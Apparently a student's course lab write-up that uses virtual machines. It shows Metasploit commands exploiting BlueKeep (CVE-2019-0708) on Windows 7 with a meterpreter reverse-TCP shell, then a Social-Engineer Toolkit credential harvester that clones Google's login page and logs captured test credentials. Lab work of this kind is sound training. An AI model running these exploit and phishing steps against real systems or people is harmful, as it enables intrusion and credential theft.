---
title: A&D of Network Security - Lab 13
tags: [NTU, NTU_PADNS]

category: "Security/Course/NTU PADNS"
---

# A&D of Network Security - Lab 13
###### tags: `Practicum of A&D of NS` `NTU`

## Metasploit with Bluekeep Vulnerability (CVE-2019-0708)

### Setting up environment
* Open Windows 7 and Kali-Linux with `localhost only` mode
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/Skg3sJ93Hh.png)
    
    ![](https://hackmd.io/_uploads/ByyTJqnHh.png)
    :::
* Then we can note that the IP of these two machines are different:
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/H1gOg5hSn.png)
    
    ![](https://hackmd.io/_uploads/H1VSlcnB3.png)
    :::
    Now, we know `Win7`'s IP: `192.168.56.101`
    Kali-Linux's IP: `192.168.56.102`

* Test the connection of these machines
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/HJ3D-5hS2.png)

    ![](https://hackmd.io/_uploads/S1eSW5hB3.png)
    :::
* Always allow the remote desktop connection of `Win7`
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/Hk0yzchB3.png)
    
    ![](https://hackmd.io/_uploads/HJQxfc3Sh.png)
    :::

### Try to Exploit
* Open Metasploit in Kali-Linux
    ```bash!
    $ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    $ info # Can check the mode you'd like to use
    $ set rhost 192.168.56.101 # set remote host IP -> victim(Win7)
    $ set lhost 192.168.56.102 # set local host IP -> attacker(Kali-Linux)
    $ set target 2 # For virtual-box mode
    $ set payload windows/x64/meterpreter/reverse_tcp # Set the exploited payload
    $ check # Check if the victim can be exploited or not
    $ exploit # Actually attack
    ```
    :::info
    Sometimes the attack will not always success, you must try until it success.
    :::
    
    :::spoiler Detailed Screenshot
    ![](https://hackmd.io/_uploads/H1PUwq2S3.png)
    ![](https://hackmd.io/_uploads/ByQ6wqnHh.png)
    :::

### Remote Desktop

## Social Engineering in Kali-Linux
1. Set up the network environment same as the lab above
2. Open Social Engineering Toolkit(root) in Kali-Linux
3. Enter Command
    ```bash!
    ...
       1) Spear-Phishing Attack Vectors
       2) Website Attack Vectors
       3) Infectious Media Generator
       4) Create a Payload and Listener
       5) Mass Mailer Attack
       6) Arduino-Based Attack Vector
       7) Wireless Access Point Attack Vector
       8) QRCode Generator Attack Vector
       9) Powershell Attack Vectors
      10) Third Party Modules

      99) Return back to the main menu.

    set> 2
    ...
       1) Java Applet Attack Method
       2) Metasploit Browser Exploit Method
       3) Credential Harvester Attack Method
       4) Tabnabbing Attack Method
       5) Web Jacking Attack Method
       6) Multi-Attack Web Method
       7) HTA Attack Method

      99) Return to Main Menu

    set:webattack>3
    ...
       1) Web Templates
       2) Site Cloner
       3) Custom Import

      99) Return to Webattack Menu

    set:webattack>1
    [-] Credential harvester will allow you to utilize the clone capabilities within SET
    [-] to harvest credentials or parameters from a website as well as place them into a report
    ...
    Enter the IP address for POST back in Harvester/Tabnabbing: 192.168.56.102 # Must using Kali-Linux IP
    ...
    -------------------------------------------------------

      1. Java Required
      2. Google
      3. Twitter

    set:webattack> Select a template:2    # You can also use other templates

    [*] Cloning the website: http://www.google.com                                                                     
    [*] This could take a little bit...                                                                                

    The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                                                              
    [*] The Social-Engineer Toolkit Credential Harvester Attack
    [*] Credential Harvester is running on port 80                                                                     
    [*] Information will be displayed to you as it arrives below:

    ```
4. Open Chrome in Win7 and enter Kali IP and enter your account/password
    :::spoiler Screenshot
    ![](https://hackmd.io/_uploads/SJBgpB1In.png)
    :::
5. Check Kali-Linux Terminal
    ```bash!
    192.168.56.101 - - [27/May/2023 05:25:50] "GET / HTTP/1.1" 200 -
    192.168.56.101 - - [27/May/2023 05:26:48] "GET /favicon.ico HTTP/1.1" 404 -
    [*] WE GOT A HIT! Printing the output:
    PARAM: GALX=SJLCkfgaqoM
    PARAM: continue=https://accounts.google.com/o/oauth2/auth?zt=ChRsWFBwd2JmV1hIcDhtUFdldzBENhIfVWsxSTdNLW9MdThibW1TMFQzVUZFc1BBaURuWmlRSQ%E2%88%99APsBz4gAAAAAUy4_qD7Hbfz38w8kxnaNouLcRiD3YTjX
    PARAM: service=lso
    PARAM: dsh=-7381887106725792428
    PARAM: _utf8=â
    PARAM: bgresponse=js_disabled
    PARAM: pstMsg=1
    PARAM: dnConn=
    PARAM: checkConnection=
    PARAM: checkedDomains=youtube
    POSSIBLE USERNAME FIELD FOUND: Email=test123
    POSSIBLE PASSWORD FIELD FOUND: Passwd=123456
    PARAM: signIn=Sign+in
    PARAM: PersistentCookie=yes
    [*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
    ```
6. Done
We try to fetch the victim's account using fake web template...